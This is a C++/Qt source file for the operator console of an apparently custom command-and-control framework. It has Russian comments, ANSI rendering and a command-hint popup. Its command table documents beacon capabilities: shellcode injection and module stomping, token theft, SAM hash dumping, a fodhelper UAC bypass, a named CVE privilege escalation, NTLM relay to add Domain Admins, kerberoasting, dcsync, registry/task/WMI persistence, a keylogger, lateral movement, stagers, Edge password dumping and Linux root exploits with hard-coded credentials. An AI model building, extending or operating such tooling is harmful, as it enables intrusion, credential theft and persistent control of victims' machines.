#include "ConsoleWidget.hpp"

#include <QAction>
#include <QApplication>
#include <QClipboard>
#include <QFrame>
#include <QKeyEvent>
#include <QLabel>
#include <QLineEdit>
#include <QMenu>
#include <QPlainTextEdit>
#include <QScreen>
#include <QScrollArea>
#include <QScrollBar>
#include <QShortcut>
#include <QTextCharFormat>
#include <QTextCursor>
#include <QVBoxLayout>

namespace co2h::client::ui {

// ---- Таблица цветов ANSI (One Dark палитра) --------------------------------
static const QColor kAnsiNormal[8] = {
    QColor("#1a1a2e"),  // 0 чёрный
    QColor("#e06c75"),  // 1 красный
    QColor("#98c379"),  // 2 зелёный
    QColor("#e5c07b"),  // 3 жёлтый
    QColor("#61afef"),  // 4 синий
    QColor("#c678dd"),  // 5 пурпурный
    QColor("#56b6c2"),  // 6 голубой
    QColor("#abb2bf"),  // 7 белый
};
static const QColor kAnsiBright[8] = {
    QColor("#5c6370"),  // 0 серый
    QColor("#ff7b86"),  // 1 яркий красный
    QColor("#b5e890"),  // 2 яркий зелёный
    QColor("#f0d67b"),  // 3 яркий жёлтый
    QColor("#7ec8ff"),  // 4 яркий синий
    QColor("#d8a0ef"),  // 5 яркий пурпурный
    QColor("#73dce6"),  // 6 яркий голубой
    QColor("#ffffff"),  // 7 яркий белый
};

namespace {

// Таблица команд: имя, синтаксис аргументов, описание.
struct CmdHelp { const char* name; const char* args; const char* desc; };

static const CmdHelp kCommands[] = {
    // ===== Common (Windows + Linux) ===========================================
    {"shell",            "<cmd>  |  shell  (no args = interactive mode)",
                         "execute a command in the OS shell (Win: cmd.exe /c, Linux: /bin/sh -c)"},
    {"ps",               "",
                         "list processes on the target"},
    {"ls",               "[path]",
                         "list files; no argument = current directory"},
    {"cd",               "<path>",
                         "change the beacon process working directory"},
    {"pwd",              "",
                         "print the beacon process working directory"},
    {"rm",               "<path>",
                         "delete a file or directory"},
    {"cp",               "<src> <dst>",
                         "copy a file"},
    {"mv",               "<src> <dst>",
                         "move/rename a file"},
    {"download",         "<remote> <local>",
                         "download a file from the target to the operator machine"},
    {"upload",           "<local> <remote>",
                         "upload a local file to the target"},
    {"screenshot",       "",
                         "capture screen to BMP (Win: GDI BitBlt, Linux: X11/fb0)"},
    {"sleep",            "<ms> [jitter]",
                         "callback interval in ms, jitter 0-100% (e.g. sleep 30000 20)"},
    {"exit",             "",
                         "gracefully terminate the beacon process (waits for current iteration)"},
    {"kill",             "",
                         "immediately kill the beacon process via TerminateProcess (no wait)"},
    // ===== Windows beacon =====================================================
    {"", "", "Windows beacon"},
    {"run",              "<cmdline>",
                         "CreateProcessW without cmd.exe (e.g. run notepad.exe)"},
    {"inject",           "<pid> <shellcode_file>",
                         "NtCreateThreadEx into a remote process"},
    {"inject_apc",       "<pid> <shellcode_file>",
                         "NtQueueApcThread across all threads of PID (alertable wait)"},
    {"migrate",          "<pid>",
                         "reflective migration into the target process; old beacon exits"},
    {"spawnto",          "<shellcode_file> [spawn_to_path]",
                         "sacrificial process suspended + NtCreateThreadEx"},
    {"modstomp",         "<shellcode_file> [dll_path]",
                         "module stomping: LoadLibraryEx + overwrite .text"},
    {"inject_dll",       "<dll_path> [args...] [--spawnto <PID>]",
                         "no --spawnto: fork&run in a new process (output via pipe); --spawnto PID: inject into existing process"},
    {"bof",              "<coff_file> [entry] [-- fmt arg1 arg2 ...]",
                         "load x64 COFF; fmt: i=int s=short z=str Z=wstr b=file"},
    {"execute-assembly", "<path.exe> [args...]",
                         "load a .NET assembly from disk and run it in the beacon process (CLR v4)"},
    {"tcp_pivot",        "<host> <port>",
                         "raw-TCP channel to the teamserver pivot listener"},
    {"getuid",           "",
                         "current user / SID"},
    {"priv_all",         "",
                         "enable all privileges in the current token (after steal_token)"},
    {"steal_token",      "<pid>",
                         "duplicate the process token (requires SeDebugPrivilege)"},
    {"make_token",       "<DOMAIN\\user> <pass>",
                         "network logon token via LogonUser NEW_CREDENTIALS"},
    {"rev2self",         "",
                         "drop impersonation"},
    {"hashdump",         "[1|2]",
                         "1=save/load hive (default), 2=direct SAM read + full decrypt (requires Admin/SYSTEM)"},
    {"privesc_admin",    "",
                         "UAC bypass: fodhelper ms-settings hijack -> High Integrity"},
    {"privesc_system",   "",
                         "SYSTEM: steal winlogon.exe token (requires SeDebugPrivilege)"},
    {"privesc_plasma",   "",
                         "SYSTEM: CVE-2020-17103 CfAbortOperation race (Cloud Files, Win10 1903-20H2)"},
    {"ldap_addda",       "<dc_ip> <beacon_ip> <user_dn> <group_dn> [listen_port=445]",
                         "EFSR TOCTOU coercion + NTLM relay -> LDAP -> add user to Domain Admins"},
    {"ldap_rbcd",        "<dc_ip> <beacon_ip> <coerce_ip> <target_dn> <attacker_sid> [listen_port=445]",
                         "EFSR coerce TARGET + relay -> LDAP -> write msDS-AllowedToActOnBehalfOfOtherIdentity"},
    {"kerberoast",       "[domain]",
                         "LDAP enum user SPN accounts + LSA TGS request -> $krb5tgs$ hashes (hashcat -m 13100/19600/19700)"},
    {"adcs_enum",        "[domain]",
                         "ADCS: check ESC1-16 (templates, CA, DC, Web Enrollment). Requires domain user."},
    {"dcsync",           "<domain> <username>",
                         "IDL_DRSGetNCChanges EXOP_REPL_SECRETS -> NT hash (requires DA or DS-Replication-Get-Changes)"},
    {"persist_reg",      "<name> <path>",
                         "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -> autostart on logon"},
    {"persist_task",     "<name> <path>",
                         "Scheduled Task via ITaskService COM -> logon trigger, hidden task"},
    {"persist_wmi",      "<name> <interval_sec> <exe_path>",
                         "WMI event sub (ROOT\\subscription, requires Admin): generates VBScript from exe path"},
    {"keylogger",        "start | dump | stop",
                         "WH_KEYBOARD_LL hook: start = begin, dump = flush to console, stop = stop and flush"},
    {"portscan",         "<target> [ports]",
                         "TCP connect scan: comma-separated \"22,80,443\", range \"1-1024\", or empty (top-30 default)"},
    {"psexec_cmd",       "<target> <command>",
                         "SCM: create temp service on target -> execute command -> output via ADMIN$ (requires Local Admin)"},
    {"wmiexec",          "<target> <command>",
                         "WMI Win32_Process::Create -> execute on target -> output via ADMIN$ (requires Local Admin)"},
    {"dcomexec",         "<target> <command>",
                         "DCOM MMC20.Application -> execute on target -> output via ADMIN$ (requires Local Admin)"},
    {"winrmexec",        "<target> <command>",
                         "WinRM WS-Management shell (port 5985) -> execute on target -> output via ADMIN$ (requires Local Admin)"},
    {"portfwd",          "add <lport> <rhost> <rport>  |  del <lport>  |  list",
                         "TCP port forwarding: listen on lport locally, proxy to rhost:rport"},
    {"stager",           "<lnk|hta|vbs|wsf|iso|chm> <url> <out_path> [--rm-after]",
                         "create and launch a stager; lnk->cmd.exe, hta->mshta, vbs/wsf->wscript, iso->IMAPI2+Mount, chm->hh.exe; --rm-after: delete after 500ms"},
    {"edge_creds",       "",
                         "dump passwords from msedge.exe memory (cleartext on heap, no Admin needed)"},
    // ===== Linux beacon =======================================================
    {"", "", "Linux beacon"},
    {"cat",              "<path>",
                         "print file contents"},
    {"mkdir",            "<path>",
                         "create a directory"},
    {"chmod",            "<mode> <path>",
                         "change file permissions (octal mode)"},
    {"env",              "",
                         "process environment variables"},
    {"whoami",           "",
                         "current user"},
    {"id",               "",
                         "uid/gid/euid/groups"},
    {"hostname",         "",
                         "hostname"},
    {"ifconfig",         "",
                         "network interfaces and addresses"},
    {"kill",             "<pid>",
                         "terminate a process (SIGKILL)"},
    {"privesc_root",     "[passwd | suid <path> | afalg <path> | copyfail <path> | copyfail_passwd | copyfail_test]",
                         "escalate to root (Dirty Pipe 5.8-5.16 / Copy Fail 4.14-6.19); copyfail_passwd: r00t / Pa$$w0rd"},
    {"dirtyfrag",        "[esp | rxrpc]",
                         "escalate to root (xfrm/ESP + rxrpc/rxkad page-cache LPE); credentials: r00t / toor"},
};

static QString sanitize(const QString& s) {
    QString r;
    r.reserve(s.size());
    for (QChar ch : s)
        if (ch != QChar('\0')) r.append(ch);
    return r;
}

} // namespace

ConsoleWidget::ConsoleWidget(QWidget* parent) : QWidget(parent) {
    auto* v = new QVBoxLayout(this);
    v->setContentsMargins(0, 0, 0, 0);

    header_ = new QLabel("  No beacon selected", this);
    header_->setContentsMargins(6, 6, 6, 6);
    header_->setStyleSheet("background: palette(alternate-base);"
                           "border-bottom: 1px solid palette(mid);");

    output_ = new QPlainTextEdit(this);
    output_->setReadOnly(true);
    output_->setMaximumBlockCount(25000);
    // Разрешаем выделение мышью И клавиатурой (Shift+стрелки/Ctrl+Home/End и т.п.)
    output_->setTextInteractionFlags(Qt::TextSelectableByMouse |
                                      Qt::TextSelectableByKeyboard);
    // Контекстное меню: правый клик по выводу → Copy / Copy All / Select All / Clear.
    output_->setContextMenuPolicy(Qt::CustomContextMenu);
    connect(output_, &QPlainTextEdit::customContextMenuRequested, this,
            [this](const QPoint& pt){
        QMenu m(output_);
        QAction* copy_sel = m.addAction("Copy");
        copy_sel->setShortcut(QKeySequence::Copy);
        copy_sel->setEnabled(output_->textCursor().hasSelection());
        QAction* copy_all = m.addAction("Copy All");
        QAction* sel_all  = m.addAction("Select All");
        sel_all->setShortcut(QKeySequence::SelectAll);
        m.addSeparator();
        QAction* clr      = m.addAction("Clear");
        QAction* picked   = m.exec(output_->mapToGlobal(pt));
        if (picked == copy_sel) output_->copy();
        else if (picked == copy_all) {
            QApplication::clipboard()->setText(sanitize(output_->toPlainText()));
        }
        else if (picked == sel_all) output_->selectAll();
        else if (picked == clr)     { output_->clear(); raw_output_.clear(); resetAnsiState(); }
    });
    // Ctrl+A / Ctrl+Shift+A работают независимо от того, в каком виджете фокус —
    // так пользователь может стоять курсором в input_ и всё равно выделить весь
    // вывод одной комбинацией.  Ctrl+Shift+C копирует весь буфер целиком.
    auto* sc_select_all = new QShortcut(QKeySequence("Ctrl+Shift+A"), this);
    sc_select_all->setContext(Qt::WidgetWithChildrenShortcut);
    connect(sc_select_all, &QShortcut::activated, this, [this]{
        output_->selectAll();
        output_->setFocus();
    });
    auto* sc_copy_all = new QShortcut(QKeySequence("Ctrl+Shift+C"), this);
    sc_copy_all->setContext(Qt::WidgetWithChildrenShortcut);
    connect(sc_copy_all, &QShortcut::activated, this, [this]{
        QApplication::clipboard()->setText(sanitize(output_->toPlainText()));
    });
    // Ctrl+C на output_ всегда копирует весь буфер, а не только выделение.
    output_->installEventFilter(this);

    input_ = new QLineEdit(this);
    input_->setPlaceholderText("shell | run | ps | ls | cd | pwd | rm | cp | mv | download | upload | inject | inject_apc | migrate | spawnto | modstomp | inject_dll | bof | execute-assembly | tcp_pivot | getuid | steal_token | make_token | rev2self | hashdump | privesc_admin | privesc_system | ldap_addda | ldap_rbcd | kerberoast | dcsync | adcs_enum | screenshot | persist_reg | persist_task | keylogger | portscan | psexec_cmd | wmiexec | dcomexec | winrmexec | portfwd | stager | sleep | exit");

    v->addWidget(header_);
    v->addWidget(output_, 1);
    v->addWidget(input_);

    connect(input_, &QLineEdit::returnPressed, this, &ConsoleWidget::onSubmit);
    connect(input_, &QLineEdit::textChanged,   this, &ConsoleWidget::onInputChanged);
    input_->installEventFilter(this);

    // Popup-подсказка: дочерний QFrame окна, поверх остального содержимого.
    // Внутри — QScrollArea с QLabel, чтобы длинный список команд не растягивал
    // окно по вертикали, а прокручивался скроллбаром справа.
    hint_ = new QFrame(this, Qt::ToolTip);
    hint_->setFrameShape(QFrame::StyledPanel);
    hint_->setStyleSheet(
        "QFrame { background: #1f2937; border: 1px solid #4b5563; }"
        "QLabel { color: #e5e7eb; padding: 6px 8px; font-family: Consolas, monospace; }"
        "QScrollArea { background: #1f2937; border: none; }"
        "QScrollBar:vertical { background: #1f2937; width: 10px; margin: 0; }"
        "QScrollBar::handle:vertical { background: #4b5563; min-height: 20px; border-radius: 4px; }"
        "QScrollBar::handle:vertical:hover { background: #6b7280; }"
        "QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical { height: 0; }"
        "QScrollBar::add-page:vertical, QScrollBar::sub-page:vertical { background: transparent; }");
    auto* hl = new QVBoxLayout(hint_);
    hl->setContentsMargins(0, 0, 0, 0);

    hint_scroll_ = new QScrollArea(hint_);
    hint_scroll_->setWidgetResizable(true);
    hint_scroll_->setHorizontalScrollBarPolicy(Qt::ScrollBarAlwaysOff);
    hint_scroll_->setVerticalScrollBarPolicy(Qt::ScrollBarAsNeeded);
    hint_scroll_->setFrameShape(QFrame::NoFrame);

    hint_label_ = new QLabel(hint_scroll_);
    hint_label_->setTextFormat(Qt::RichText);
    hint_label_->setAlignment(Qt::AlignTop | Qt::AlignLeft);
    hint_label_->setWordWrap(false);
    hint_scroll_->setWidget(hint_label_);

    hl->addWidget(hint_scroll_);
    hint_->hide();
}

void ConsoleWidget::setBeaconId(const QString& id) {
    if (id == beacon_id_) return;

    // Сохраняем состояние текущего бикона.
    if (!beacon_id_.isEmpty()) {
        output_by_beacon_[beacon_id_]  = raw_output_;
        history_by_beacon_[beacon_id_] = history_;
        ishell_by_beacon_[beacon_id_]  = ishell_mode_;
        ansi_by_beacon_[beacon_id_]    = ansi_;
    }

    beacon_id_ = id;

    // Восстанавливаем состояние нового бикона (или очищаем).
    output_->clear();
    resetAnsiState();
    raw_output_.clear();

    if (output_by_beacon_.contains(id)) {
        raw_output_ = output_by_beacon_[id];
        // Восстанавливаем ANSI-состояние, перерисовываем, затем ставим сохранённый стейт.
        // (перерисовка сама пропарсит все ESC-коды и обновит ansi_)
        appendAnsiText(raw_output_);
    }
    // Восстанавливаем ANSI-стейт, который был при уходе с этого бикона —
    // он может отличаться от того, что получился при перерисовке, если
    // пришёл новый вывод пока бикон был в фоне.
    if (ansi_by_beacon_.contains(id))
        ansi_ = ansi_by_beacon_[id];

    history_ = history_by_beacon_.value(id);
    histIdx_ = -1;

    // Восстанавливаем режим интерактивного шела.
    bool was_ishell = ishell_by_beacon_.value(id, false);
    if (was_ishell && !ishell_mode_)
        enterInteractiveShell();
    else if (!was_ishell && ishell_mode_)
        exitInteractiveShell();

    updateHeader();
}

void ConsoleWidget::setBeaconAlias(const QString& alias) {
    beacon_alias_ = alias;
    updateHeader();
}

void ConsoleWidget::updateHeader() {
    if (beacon_id_.isEmpty()) {
        header_->setText("  No beacon selected");
        return;
    }

    // Формат: "beacon <alias> (<id>)" или "beacon <id>" если псевдоним не задан.
    QString display;
    if (!beacon_alias_.isEmpty())
        display = QString("%1 (%2)").arg(beacon_alias_, beacon_id_);
    else
        display = beacon_id_;

    if (ishell_mode_)
        header_->setText(QString("  beacon %1  [interactive shell]").arg(display));
    else
        header_->setText(QString("  beacon %1").arg(display));
}

// ---- ANSI SGR парсер --------------------------------------------------------

QColor ConsoleWidget::ansiColor(int idx, bool bright) {
    if (idx < 0 || idx > 7) return QColor("#c8d4e8");
    return bright ? kAnsiBright[idx] : kAnsiNormal[idx];
}

QColor ConsoleWidget::ansi256Color(int idx) {
    if (idx < 0)   idx = 0;
    if (idx > 255) idx = 255;
    // 0–7: стандартные
    if (idx < 8)   return kAnsiNormal[idx];
    // 8–15: яркие
    if (idx < 16)  return kAnsiBright[idx - 8];
    // 16–231: RGB куб 6×6×6
    if (idx < 232) {
        int v = idx - 16;
        int b = v % 6;  v /= 6;
        int g = v % 6;
        int r = v / 6;
        auto comp = [](int c) -> int { return c ? 55 + 40 * c : 0; };
        return QColor(comp(r), comp(g), comp(b));
    }
    // 232–255: оттенки серого (24 ступени)
    int gray = 8 + 10 * (idx - 232);
    return QColor(gray, gray, gray);
}

void ConsoleWidget::resetAnsiState() {
    ansi_ = AnsiState{};
}

QTextCharFormat ConsoleWidget::ansiFormat() const {
    QTextCharFormat f;
    QColor fg = ansi_.fg;
    QColor bg = ansi_.bg;
    if (ansi_.reverse) std::swap(fg, bg);
    if (ansi_.dim && fg.isValid())
        fg = fg.darker(150);
    f.setForeground(fg.isValid() ? fg : QColor("#c8d4e8"));
    if (bg.isValid())
        f.setBackground(bg);
    if (ansi_.bold)
        f.setFontWeight(QFont::Bold);
    if (ansi_.italic)
        f.setFontItalic(true);
    if (ansi_.underline)
        f.setFontUnderline(true);
    return f;
}

void ConsoleWidget::parseAnsiSGR(const QVector<int>& params) {
    if (params.isEmpty()) { resetAnsiState(); return; }
    int i = 0;
    while (i < params.size()) {
        int c = params[i];
        switch (c) {
        case 0:  resetAnsiState(); break;
        case 1:  ansi_.bold = true;  break;
        case 2:  ansi_.dim  = true;  break;
        case 3:  ansi_.italic = true; break;
        case 4:  ansi_.underline = true; break;
        case 7:  ansi_.reverse = true; break;
        case 22: ansi_.bold = false; ansi_.dim = false; break;
        case 23: ansi_.italic = false; break;
        case 24: ansi_.underline = false; break;
        case 27: ansi_.reverse = false; break;
        // Цвет текста: стандартные
        case 30: case 31: case 32: case 33:
        case 34: case 35: case 36: case 37:
            ansi_.fg = ansiColor(c - 30, ansi_.bold);
            break;
        // Расширенный цвет текста: 38;5;N (256) или 38;2;R;G;B (truecolor)
        case 38:
            if (i + 1 < params.size()) {
                if (params[i+1] == 5 && i + 2 < params.size()) {
                    ansi_.fg = ansi256Color(params[i+2]);
                    i += 2;
                } else if (params[i+1] == 2 && i + 4 < params.size()) {
                    ansi_.fg = QColor(params[i+2], params[i+3], params[i+4]);
                    i += 4;
                }
            }
            break;
        case 39: ansi_.fg = QColor("#c8d4e8"); break;
        // Цвет фона: стандартные
        case 40: case 41: case 42: case 43:
        case 44: case 45: case 46: case 47:
            ansi_.bg = ansiColor(c - 40, false);
            break;
        // Расширенный цвет фона
        case 48:
            if (i + 1 < params.size()) {
                if (params[i+1] == 5 && i + 2 < params.size()) {
                    ansi_.bg = ansi256Color(params[i+2]);
                    i += 2;
                } else if (params[i+1] == 2 && i + 4 < params.size()) {
                    ansi_.bg = QColor(params[i+2], params[i+3], params[i+4]);
                    i += 4;
                }
            }
            break;
        case 49: ansi_.bg = QColor(); break;
        // Яркие цвета текста
        case 90: case 91: case 92: case 93:
        case 94: case 95: case 96: case 97:
            ansi_.fg = ansiColor(c - 90, true);
            break;
        // Яркие цвета фона
        case 100: case 101: case 102: case 103:
        case 104: case 105: case 106: case 107:
            ansi_.bg = ansiColor(c - 100, true);
            break;
        default: break;
        }
        ++i;
    }
}

void ConsoleWidget::appendAnsiText(const QString& text) {
    auto cursor = output_->textCursor();
    cursor.movePosition(QTextCursor::End);

    int i = 0;
    const int len = text.length();
    int segStart = 0;    // начало текущего текстового сегмента

    while (i < len) {
        QChar ch = text[i];
        // \r — пропускаем (прогресс-бары не поддерживаем в лог-виджете)
        if (ch == '\r') {
            if (segStart < i)
                cursor.insertText(text.mid(segStart, i - segStart), ansiFormat());
            ++i;
            segStart = i;
            continue;
        }
        // ESC — начало escape-последовательности
        if (ch == '\x1b') {
            // Вывести накопленный текст до ESC
            if (segStart < i)
                cursor.insertText(text.mid(segStart, i - segStart), ansiFormat());
            ++i;
            if (i >= len) { segStart = i; break; }

            if (text[i] == '[') {
                // CSI: ESC [ <параметры> <финальный байт>
                ++i;
                QVector<int> params;
                int num = -1;
                while (i < len) {
                    QChar c = text[i];
                    if (c >= '0' && c <= '9') {
                        if (num < 0) num = 0;
                        num = num * 10 + (c.unicode() - '0');
                        ++i;
                    } else if (c == ';') {
                        params.append(num < 0 ? 0 : num);
                        num = -1;
                        ++i;
                    } else {
                        // Финальный байт (0x40–0x7E)
                        if (num >= 0) params.append(num);
                        if (c == 'm') parseAnsiSGR(params);
                        // Остальные CSI (cursor movement и пр.) — пропускаем
                        ++i;
                        break;
                    }
                }
            } else if (text[i] == ']') {
                // OSC: ESC ] ... BEL / ST
                ++i;
                while (i < len) {
                    if (text[i] == '\x07') { ++i; break; }
                    if (text[i] == '\x1b' && i + 1 < len && text[i+1] == '\\')
                        { i += 2; break; }
                    ++i;
                }
            } else if (text[i] == '(' || text[i] == ')') {
                // Charset select: ESC ( X / ESC ) X
                i += (i + 1 < len) ? 2 : 1;
            } else {
                // ESC + одиночная буква
                if (i < len && text[i] >= '@' && text[i] <= '~') ++i;
            }
            segStart = i;
            continue;
        }
        ++i;
    }
    // Остаток текста после последнего ESC
    if (segStart < len)
        cursor.insertText(text.mid(segStart), ansiFormat());

    output_->setTextCursor(cursor);
    output_->ensureCursorVisible();
}

// Ограничение raw_output_: оставляем последние ~25000 строк,
// чтобы буфер не рос бесконечно (параллельно с setMaximumBlockCount виджета).
static constexpr int kMaxRawLines = 25000;

static void trimRawOutput(QString& raw) {
    // Быстрая проверка: считаем '\n' от конца, находим точку среза.
    int n = 0;
    int cutPos = -1;
    for (int i = raw.size() - 1; i >= 0; --i) {
        if (raw[i] == '\n') {
            if (++n >= kMaxRawLines) { cutPos = i + 1; break; }
        }
    }
    if (cutPos > 0)
        raw.remove(0, cutPos);
}

// Убираем нулевые байты: clipboard на Windows обрезает строку на первом \0.
void ConsoleWidget::appendOutput(const QString& text) {
    QString s = sanitize(text);
    while (s.endsWith('\n')) s.chop(1);
    s += '\n';
    raw_output_ += s;
    trimRawOutput(raw_output_);
    appendAnsiText(s);
}

void ConsoleWidget::appendError(const QString& text) {
    QString s = sanitize(text) + "\n";
    raw_output_ += s;
    trimRawOutput(raw_output_);
    QTextCharFormat f;
    f.setForeground(QColor("#f87171"));
    auto c = output_->textCursor();
    c.movePosition(QTextCursor::End);
    c.insertText(s, f);
    output_->setTextCursor(c);
    output_->ensureCursorVisible();
}

void ConsoleWidget::appendOutputForBeacon(const QString& beaconId,
                                           const QString& text) {
    if (beaconId == beacon_id_) {
        appendOutput(text);
    } else {
        // Бикон не текущий — сохраняем сырой ANSI-текст для перерисовки.
        QString s = sanitize(text);
        while (s.endsWith('\n')) s.chop(1);
        output_by_beacon_[beaconId] += s + "\n";
    }
}

void ConsoleWidget::appendErrorForBeacon(const QString& beaconId,
                                          const QString& text) {
    if (beaconId == beacon_id_) {
        appendError(text);
    } else {
        // Бикон не текущий — сохраняем в буфер (ошибка как текст).
        output_by_beacon_[beaconId] += sanitize(text) + "\n";
    }
}

void ConsoleWidget::enterInteractiveShell() {
    ishell_mode_ = true;
    input_->setPlaceholderText("type commands (or 'exit' to leave interactive shell)");
    updateHeader();
    hideHint();
}

void ConsoleWidget::exitInteractiveShell() {
    ishell_mode_ = false;
    input_->setPlaceholderText("shell | run | ps | ls | cd | pwd | rm | cp | mv | download | upload | inject | inject_apc | migrate | spawnto | modstomp | inject_dll | bof | execute-assembly | tcp_pivot | getuid | steal_token | make_token | rev2self | hashdump | privesc_admin | privesc_system | ldap_addda | ldap_rbcd | kerberoast | dcsync | adcs_enum | screenshot | persist_reg | persist_task | keylogger | portscan | psexec_cmd | wmiexec | dcomexec | winrmexec | portfwd | stager | sleep | exit");
    updateHeader();
}

void ConsoleWidget::onInputChanged(const QString& text) {
    if (ishell_mode_) { hideHint(); return; }
    updateHintPopup(text);
}

void ConsoleWidget::hideHint() {
    if (hint_ && hint_->isVisible()) hint_->hide();
    hint_complete_.clear();
}

bool ConsoleWidget::eventFilter(QObject* obj, QEvent* ev) {
    if (obj == input_ && ev->type() == QEvent::KeyPress && hint_->isVisible()) {
        auto* ke = static_cast<QKeyEvent*>(ev);
        if (ke->key() == Qt::Key_Escape) {
            hideHint();
            return true;
        }
        if (ke->key() == Qt::Key_Tab && !hint_complete_.isEmpty()) {
            input_->setText(hint_complete_ + ' ');
            input_->end(false);
            return true;
        }
        // Enter — скрыть подсказку, но пропустить событие дальше (onSubmit выполнит команду).
        if (ke->key() == Qt::Key_Return || ke->key() == Qt::Key_Enter) {
            hideHint();
        }
    }
    // Ctrl+C на output_ копирует весь буфер (не только выделение).
    if (obj == output_ && ev->type() == QEvent::KeyPress) {
        auto* ke = static_cast<QKeyEvent*>(ev);
        if (ke->key() == Qt::Key_C && (ke->modifiers() & Qt::ControlModifier)
                && !(ke->modifiers() & Qt::ShiftModifier)) {
            QApplication::clipboard()->setText(sanitize(output_->toPlainText()));
            return true;
        }
    }
    return QWidget::eventFilter(obj, ev);
}

void ConsoleWidget::positionHint() {
    if (!hint_ || !input_) return;
    // Помещаем popup непосредственно НАД полем ввода, выравнивая по левому краю.
    QPoint anchor = input_->mapToGlobal(QPoint(0, 0));

    // Максимальная высота подсказки — четверть высоты экрана, но не больше 260 px.
    // Если содержимое больше — включается вертикальный скроллбар.
    int screen_h = QGuiApplication::primaryScreen()
                       ? QGuiApplication::primaryScreen()->availableGeometry().height()
                       : 800;
    int max_h = qMin(260, screen_h / 4);

    // Желаемый размер по содержимому label + рамка + скроллбар при необходимости.
    int desired_h = hint_label_->sizeHint().height() + 4;
    int desired_w = hint_label_->sizeHint().width()  + 4;
    int h = qMin(desired_h, max_h);
    if (desired_h > max_h) desired_w += hint_scroll_->verticalScrollBar()->sizeHint().width();
    hint_->resize(desired_w, h);

    int x = anchor.x();
    int y = anchor.y() - hint_->height() - 2;
    hint_->move(x, y);
}

void ConsoleWidget::updateHintPopup(const QString& text) {
    // Пустое поле — скрываем; одиночный пробел — показываем полный список команд.
    if (text.isEmpty()) { hideHint(); return; }

    const QString trimmed = text.trimmed();
    const bool showAll = trimmed.isEmpty();

    // Первое слово (без учёта последующих аргументов).
    const int sp = trimmed.indexOf(QChar(' '));
    const QString first = (sp < 0) ? trimmed : trimmed.left(sp);
    const bool hasSpace = (!showAll) && (sp >= 0);

    QString html;
    if (hasSpace) {
        // Точное совпадение → синтаксис + описание выбранной команды.
        hint_complete_.clear(); // в args-режиме автодополнение не нужно
        const CmdHelp* match = nullptr;
        for (const auto& c : kCommands) {
            if (c.name[0] == '\0') continue; // пропустить разделитель
            if (first.compare(QString::fromUtf8(c.name), Qt::CaseInsensitive) == 0) {
                match = &c; break;
            }
        }
        if (match) {
            html = QString("<b style='color:#93c5fd'>%1</b> "
                           "<span style='color:#fcd34d'>%2</span><br>"
                           "<span style='color:#9ca3af'>%3</span>")
                       .arg(QString::fromUtf8(match->name),
                            QString::fromUtf8(match->args).toHtmlEscaped(),
                            QString::fromUtf8(match->desc));
        } else {
            // Check plugin-registered commands.
            for (const auto& ec : ext_commands_) {
                if (first.compare(ec.name, Qt::CaseInsensitive) == 0) {
                    html = QString("<b style='color:#93c5fd'>%1</b> "
                                   "<span style='color:#fcd34d'>%2</span><br>"
                                   "<span style='color:#9ca3af'>%3</span> "
                                   "<span style='color:#6b7280'>[plugin]</span>")
                               .arg(ec.name, ec.args.toHtmlEscaped(), ec.desc);
                    break;
                }
            }
            if (html.isEmpty()) { hideHint(); return; }
        }
    } else {
        // Префиксный фильтр; при showAll — все команды без ограничения.
        hint_complete_.clear();
        QStringList rows;
        QString pending_section;  // заголовок секции, ожидающий вставки
        bool plugins_inserted = false;
        int separator_idx = 0;
        for (const auto& c : kCommands) {
            // Разделитель секции.
            // При втором разделителе (перед Linux) — вставляем плагины
            // (они относятся к Windows-секции).
            if (c.name[0] == '\0') {
                if (separator_idx > 0 && !plugins_inserted) {
                    for (const auto& ec : ext_commands_) {
                        if (showAll || ec.name.startsWith(first, Qt::CaseInsensitive)) {
                            if (hint_complete_.isEmpty()) hint_complete_ = ec.name;
                            rows << QString("<b style='color:#93c5fd'>%1</b> "
                                            "<span style='color:#fcd34d'>%2</span> "
                                            "<span style='color:#6b7280'>[plugin]</span> "
                                            "<span style='color:#9ca3af'>— %3</span>")
                                        .arg(ec.name, ec.args.toHtmlEscaped(), ec.desc);
                        }
                    }
                    plugins_inserted = true;
                }
                if (!rows.isEmpty())
                    pending_section = QString::fromUtf8(c.desc);
                ++separator_idx;
                continue;
            }
            const QString name = QString::fromUtf8(c.name);
            if (showAll || name.startsWith(first, Qt::CaseInsensitive)) {
                if (!pending_section.isEmpty()) {
                    rows << QString("<div style='margin:4px 0 2px 0; border-top:1px solid #4b5563; "
                                    "padding-top:3px; color:#6b7280; font-size:10px'>"
                                    "── %1 ──</div>").arg(pending_section);
                    pending_section.clear();
                }
                if (hint_complete_.isEmpty()) hint_complete_ = name;
                rows << QString("<b style='color:#93c5fd'>%1</b> "
                                "<span style='color:#fcd34d'>%2</span> "
                                "<span style='color:#9ca3af'>— %3</span>")
                            .arg(name,
                                 QString::fromUtf8(c.args).toHtmlEscaped(),
                                 QString::fromUtf8(c.desc));
            }
            if (!showAll && rows.size() >= 8) break;
        }
        // Если разделителя нет в массиве — плагины всё равно попадут в конец.
        if (!plugins_inserted) {
            for (const auto& ec : ext_commands_) {
                if (showAll || ec.name.startsWith(first, Qt::CaseInsensitive)) {
                    if (hint_complete_.isEmpty()) hint_complete_ = ec.name;
                    rows << QString("<b style='color:#93c5fd'>%1</b> "
                                    "<span style='color:#fcd34d'>%2</span> "
                                    "<span style='color:#6b7280'>[plugin]</span> "
                                    "<span style='color:#9ca3af'>— %3</span>")
                                .arg(ec.name, ec.args.toHtmlEscaped(), ec.desc);
                }
            }
        }
        if (rows.isEmpty()) { hideHint(); return; }
        html = rows.join("<br>");
    }

    hint_label_->setText(html);
    hint_label_->adjustSize();
    hint_scroll_->verticalScrollBar()->setValue(0);
    positionHint();
    if (!hint_->isVisible()) hint_->show();
    hint_->raise();
}

void ConsoleWidget::registerExternalCommand(const QString& name,
                                              const QString& args,
                                              const QString& desc) {
    ext_commands_.append({name, args, desc});
}

void ConsoleWidget::onSubmit() {
    const auto text = input_->text().trimmed();
    if (text.isEmpty()) return;

    history_.append(text);
    histIdx_ = history_.size();

    QString prompt_line = (ishell_mode_ ? "$ " : "> ") + text + "\n";
    raw_output_ += prompt_line;
    QTextCharFormat f;
    f.setForeground(QColor("#60a5fa"));
    auto c = output_->textCursor();
    c.movePosition(QTextCursor::End);
    c.insertText(prompt_line, f);
    output_->setTextCursor(c);
    input_->clear();
    hideHint();

    if (beacon_id_.isEmpty()) {
        appendError("no beacon selected — double-click a row in Sessions");
        return;
    }

    if (ishell_mode_) {
        if (text == "exit") {
            emit ishellStop(beacon_id_);
        } else {
